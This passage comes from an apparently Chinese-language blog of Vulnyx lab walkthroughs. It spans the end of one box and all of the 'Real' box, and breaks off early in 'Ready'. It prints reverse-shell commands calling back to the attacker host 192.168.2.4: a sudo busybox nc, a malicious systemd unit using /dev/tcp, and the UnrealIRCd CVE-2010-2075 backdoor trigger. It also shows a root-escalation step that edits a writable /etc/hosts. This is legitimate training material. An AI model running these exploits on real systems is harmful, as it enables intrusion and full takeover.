sh<br></code></pre></td></tr></table></figure><p>反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash-4.3$ <span class="hljs-built_in">sudo</span> -u will /usr/bin/busybox nc 192.168.2.4 4444 -e /bin/bash<br></code></pre></td></tr></table></figure><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.36] 60558<br><span class="hljs-built_in">id</span><br>uid=1001(will) gid=1001(will) <span class="hljs-built_in">groups</span>=1001(will)<br></code></pre></td></tr></table></figure><p>稳定shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/script -qc /bin/bash /dev/null<br><span class="hljs-comment"># 按下 Ctrl+Z 将其挂起</span><br><span class="hljs-built_in">stty</span> raw -<span class="hljs-built_in">echo</span>; <span class="hljs-built_in">fg</span><br><span class="hljs-comment"># 按下回车</span><br>reset xterm<br><span class="hljs-built_in">export</span> TERM=xterm<br><span class="hljs-built_in">export</span> SHELL=/bin/bash<br><span class="hljs-built_in">stty</span> rows 24 columns 80<br></code></pre></td></tr></table></figure><h2 id="2、获取root权限"><a href="#2、获取root权限" class="headerlink" title="2、获取root权限"></a>2、获取root权限</h2><p>查看<code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">will@shock:~$ <span class="hljs-built_in">sudo</span> -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> will on shock:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User will may run the following commands on shock:<br>    (root) NOPASSWD: /usr/bin/systemctl<br></code></pre></td></tr></table></figure><p><code>will</code>用户可以使用<code>root</code>权限来执行<code>/usr/bin/systemctl</code></p><p>直接使用下面方式提权即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl<br>!sh<br></code></pre></td></tr></table></figure><h3 id="systemctl提权"><a href="#systemctl提权" class="headerlink" title="systemctl提权"></a>systemctl提权</h3><p><strong>利用方式：</strong></p><ol><li><p>创建一个恶意服务单元文件（需有写权限的目录，如 <code>/tmp</code>）：<br>部分 Linux 发行版（如 Ubuntu 22.04+、RHEL 8+）出于安全考虑，<strong>禁止从 <code>/tmp</code>、<code>/dev/shm</code> 等临时目录加载 systemd 单元</strong>。因此在<code>/home/will</code>目录创建<code>pwn.service</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> &gt; pwn.service &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>[Unit]<br>Description=Pwn Service<br><br>[Service]<br>Type=oneshot<br>ExecStart=/bin/bash -c <span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/192.168.2.4/4444 0&gt;&amp;1&#x27;</span><br>RemainAfterExit=<span class="hljs-built_in">yes</span><br><br>[Install]<br>WantedBy=multi-user.target<br>EOF<br></code></pre></td></tr></table></figure></li><li><p>通过 systemctl 加载该服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">link</span> /home/will/pwn.service <br><span class="hljs-comment">#systemctl link必须使用绝对路径，不能只写文件名。</span><br></code></pre></td></tr></table></figure></li><li><p>启动该服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl start pwn.service<br></code></pre></td></tr></table></figure></li></ol><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.36] 60560<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1139): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@shock:/# <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、查看FLAG"><a href="#五、查看FLAG" class="headerlink" title="五、查看FLAG"></a>五、查看FLAG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@shock:/# <span class="hljs-built_in">cat</span> /root/root.txt /home/will/user.txt<br>f47fa61f24939dfcc393936fe15382d4<br>0afcf82e564efd49b65e8071b1d8b11c<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CGI</tag>
      
      <tag>sudo-busybox</tag>
      
      <tag>sudo-systemctl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Real</title>
    <link href="/Vulnyx/Real/"/>
    <url>/Vulnyx/Real/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/">https://vulnyx.com/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00034s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00085s latency).<br>MAC Address: 08:00:27:48:64:28 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00078s latency).<br>MAC Address: 08:00:27:2C:CF:5E (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.13 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.37</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.37                      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 09:13 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.0017s latency).<br>Not shown: 65530 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>6667/tcp open  irc<br>6697/tcp open  ircs-u<br>8067/tcp open  infi-async<br>MAC Address: 08:00:27:2C:CF:5E (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 36.26 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22、80、6667、6697、8067</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80,6667,6697,8067 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 09:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00094s latency).<br><br>PORT     STATE SERVICE VERSION<br>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 db:28:2b:ab:63:2a:0e:d5:ea:18:8d:2f:6d:8c:45:2d (RSA)<br>|   256 <span class="hljs-built_in">cd</span>:a1:c3:2e:20:f0:f3:f6:d3:9b:27:8e:9a:2d:26:11 (ECDSA)<br>|_  256 db:98:69:a5:8b:bd:05:86:16:3d:9c:8b:30:7b:a3:6c (ED25519)<br>80/tcp   open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Apache2 Debian Default Page: It works<br>|_http-server-header: Apache/2.4.38 (Debian)<br>6667/tcp open  irc     UnrealIRCd (Admin email example@example.com)<br>6697/tcp open  irc     UnrealIRCd<br>8067/tcp open  irc     UnrealIRCd<br>MAC Address: 08:00:27:2C:CF:5E (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.83 seconds<br></code></pre></td></tr></table></figure><h3 id="3-udp扫描"><a href="#3-udp扫描" class="headerlink" title="3.udp扫描"></a>3.udp扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sU --top-ports 100 192.168.2.37                                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 09:15 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.00071s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:2C:CF:5E (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 102.93 seconds<br></code></pre></td></tr></table></figure><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><p>Apache默认页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601080934799.png"></p><h2 id="2、IRC协议"><a href="#2、IRC协议" class="headerlink" title="2、IRC协议"></a>2、IRC协议</h2><p>IRC，最初是一个<strong>纯文本协议</strong>，由IANA分配了<strong>194&#x2F;TCP</strong>，但通常在<strong>6667&#x2F;TCP</strong>和类似端口上运行，以避免需要<strong>root权限</strong>进行操作。<br>连接到服务器只需要一个<strong>昵称</strong>。连接后，服务器会对用户的IP进行反向DNS查找。<br>用户分为<strong>操作员</strong>和普通<strong>用户</strong>，操作员需要<strong>用户名</strong>和<strong>密码</strong>以获得更多访问权限。操作员的权限级别各不相同，管理员位于最高层。</p><p>💡Tip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-irc.html<br></code></pre></td></tr></table></figure><p>在初始扫描中发现 UnrealIRCd 服务运行在多个端口上（6667&#x2F;tcp、6697&#x2F;tcp、8067&#x2F;tcp）。UnrealIRCd 有一个著名的后门漏洞，需要进一步确认目标上的版本是否存在此漏洞。</p><p>使用 Nmap 针对 IRC 服务进行漏洞探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -p 6667,6697,8067 --script irc-unrealircd-backdoor 192.168.2.37<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-08 09:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.37<br>Host is up (0.0010s latency).<br><br>PORT     STATE SERVICE<br>6667/tcp open  irc<br>|_irc-unrealircd-backdoor: Server closed connection, possibly due to too many reconnects. Try again with argument irc-unrealircd-backdoor.wait <span class="hljs-built_in">set</span> to 100 (or higher <span class="hljs-keyword">if</span> you get this message again).<br>6697/tcp open  ircs-u<br>8067/tcp open  infi-async<br>|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277<br>MAC Address: 08:00:27:2C:CF:5E (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 46.48 seconds<br></code></pre></td></tr></table></figure><p>扫描结果确认端口 8067 上运行的 UnrealIRCd 存在后门漏洞。这是一个严重的远程命令执行漏洞（CVE-2010-2075），允许攻击者在服务器上执行任意命令。</p><h1 id="三、获取server权限"><a href="#三、获取server权限" class="headerlink" title="三、获取server权限"></a>三、获取server权限</h1><p>确认目标存在 UnrealIRCd 后门漏洞后，开始尝试利用该漏洞执行命令</p><ol><li><p>发送反弹 shell 命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;AB; nc -e /bin/bash 192.168.2.4 4444&quot;</span> | nc 192.168.2.37 8067<br>:irc.foonet.com NOTICE AUTH :*** Looking up your hostname...<br>:irc.foonet.com NOTICE AUTH :*** Couldn<span class="hljs-string">&#x27;t resolve your hostname; using your IP address instead</span><br><span class="hljs-string">:irc.foonet.com NOTICE AUTH :*** Couldn&#x27;</span>t resolve your hostname; using your IP address instead<br><br></code></pre></td></tr></table></figure></li><li><p>获取到shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 4444<br>listening on [any] 4444 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.37] 41932<br><span class="hljs-built_in">id</span><br>uid=1000(server) gid=1000(server) <span class="hljs-built_in">groups</span>=1000(server)<br></code></pre></td></tr></table></figure></li></ol><h1 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h1><p>查看到<code>/opt</code>下面存在文件<code>task</code>具有root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@real:/opt$ <span class="hljs-built_in">ls</span> -la<br>-rwx---r--  1 root root  277 May  3  2023 task<br></code></pre></td></tr></table></figure><p>脚本分析：<br>尝试 ping 一个指定的域名，如果能通，则反向连接到该域名的 65000 端口，并反弹一个root-shell（即执行 <code>/bin/sh</code>）；否则退出。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@real:/opt$ <span class="hljs-built_in">cat</span> task<br><span class="hljs-comment">#!/bin/bash</span><br><br>domain=<span class="hljs-string">&#x27;shelly.real.nyx&#x27;</span><br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">check</span></span>()&#123;<br><br>        <span class="hljs-built_in">timeout</span> 1 bash -c <span class="hljs-string">&quot;/usr/bin/ping -c 1 <span class="hljs-variable">$domain</span>&quot;</span> &gt; /dev/null 2&gt;&amp;1<br>    <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-subst">$(echo $?)</span>&quot;</span> == <span class="hljs-string">&quot;0&quot;</span> ]; <span class="hljs-keyword">then</span><br>        /usr/bin/nohup nc -e /usr/bin/sh <span class="hljs-variable">$domain</span> 65000<br>        <span class="hljs-built_in">exit</span> 0<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">exit</span> 1<br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br>check<br></code></pre></td></tr></table></figure><p>查找可写的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@real:/opt$ find / \( -path /proc -o -path /sys \) -prune -o -perm -o=w -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>/home/server/irc/Unreal3.2/tmp/103B282.commands.so<br>/home/server/irc/Unreal3.2/tmp/23FC6410.cloak.so<br>/home/server/irc/Unreal3.2/ircd.log<br>/home/server/irc/Unreal3.2/unreal<br>/home/server/irc/Unreal3.2/src/modules/cloak.so<br>/home/server/irc/Unreal3.2/src/modules/commands.so<br>/etc/hosts<br></code></pre></td></tr></table></figure><p>发现<code>/etc/hosts</code>可以写入内容，又根据<code>task</code>脚本的信息，尝试写入一个域名解析<br>将域名<code>shelly.real.nyx</code>解析到攻击机上<code>192.168.2.4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">server@real:/opt$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.4 shelly.real.nyx&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><p>攻击机上开启监听65000端口，等待一段时间，成功获取到root-shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─# nc -lvnp 65000<br>listening on [any] 65000 ...<br>connect to [192.168.2.4] from (UNKNOWN) [192.168.2.37] 50170<br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br></code></pre></td></tr></table></figure><h1 id="五、查看FALG"><a href="#五、查看FALG" class="headerlink" title="五、查看FALG"></a>五、查看FALG</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/root.txt /home/server/user.txt<br>593ba7e2d1e66b12e1488d6ea30c8787<br>3b7fb7c1c8737a5c67dc513657e3efb3<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>UnrealIRCd</tag>
      
      <tag>CVE-2010-2075</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ready</title>
    <link href="/Vulnyx/Ready/"/>
    <url>/Vulnyx/Ready/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul><li><a href="https://vulnyx.com/">https://vulnyx.com/</a></li></ul><h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap -sn 192.168.2.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 14:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00036s latency).<br>MAC Address: 0A:00:27:00:00:07 (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00065s latency).<br>MAC Address: 08:00:27:CC:CD:C8 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.34<br>Host is up (0.00096s latency).<br>MAC Address: 08:00:27:EE:9A:C7 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.14 seconds<br></code></pre></td></tr></table></figure><p>靶机IP：<code>192.168.2.34</code></p><h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -p- 192.168.2.34                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 14:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.34<br>Host is up (0.00047s latency).<br>Not shown: 65532 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>80/tcp   open  http<br>6379/tcp open  redis<br>8080/tcp open  http-proxy<br>MAC Address: 08:00:27:EE:9A:C7 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 6.00 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>80、6379、8080</code></p><h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miaosec]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p80,6379,8080 192.168.2.34<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 14:27 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.34<br>Host is up (0.00060s latency).<br><br>PORT     STATE SERVICE VERSION<br>80/tcp   open  http    Apache httpd 2.4.54 ((Debian))<br>|_http-server-header: Apache/2.4.54 (Debian)<br>|_http-title: Apache2 Test Debian Default Page: It works<br>6379/tcp open  redis   Redis key-value store 6.0.16<br>8080/tcp open  http    Apache httpd 2.4.54 ((Debian))<br>|_http-title: Apache2 Test Debian Default Page: It works<br>|_http-server-header: Apache/2.4.54 (Debian)<br>MAC Address: 08:00:27:EE:9A:C7 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.36 seconds<br></code></pre></td></tr></table></figure><ol><li><code>6379</code>为redis服务</li></ol><h1 id="二、WEB渗透"><a href="#二、WEB渗透" class="headerlink" title="二、WEB渗透"></a>二、WEB渗透</h1><h2 id="1、80端口"><a href="#1、80端口" class="headerlink" title="1、80端口"></a>1、80端口</h2><h3 id="1-网站"><a href="#1-网站" class="headerlink" title="1-网站"></a>1-网站</h3><p><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202601061509459.png"></p><h3 id="2-目录扫描"><a href="#2-目录扫描" class="headerlink" title="2-目录扫描"></a>2-目录扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 